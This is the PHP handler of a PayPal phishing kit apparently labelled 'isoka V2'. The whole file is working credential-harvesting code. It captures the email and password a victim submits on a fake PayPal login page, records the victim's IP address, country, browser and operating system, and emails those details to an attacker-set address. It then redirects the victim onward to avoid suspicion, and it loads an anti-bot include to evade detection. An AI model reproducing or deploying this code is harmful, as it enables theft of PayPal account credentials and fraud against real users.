<?
session_start();
date_default_timezone_set('GMT');
$time = date('d/m/Y G:i:s');
include('../antibots.php');
include('../email.php');
$_SESSION['login'] = 'success';
$_SESSION['email'] = $_POST['email'];
$_SESSION['pass'] = $_POST ['pass'];
$msg = "
<html>
<head><meta charset=\"UTF-8\">
</head>
-------------- isoka V2 --------------<br>
Email : ".$_SESSION['email']."<br>
Mot-Pass : ".$_SESSION['pass']."<br>
Pays     = <font style='color:#08559C;'>".$_SESSION['cn']."</font><br>
Navigateur  = <font style='color:#08559C;'>".$_SESSION['bro']." On ".$_SESSION['os']."</font><br>
IP: "._ip()."<br>
-------------- isoka V2 --------------
</html>\n";
$subject = "🍀 Paypal Account 🍀 [".$_SESSION['code_cn']."] [".$_SESSION['ip']."]";
$headers = "From:🐉 Hunter x Hunter V2 🐉 <Rez@isoka>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";
	@mail($adresse_email,$subject,$msg,$headers);
		header("Location: ./home?websc=_session=".$_SESSION['code_cn']."&".$_SESSION['SESSION']."");

?>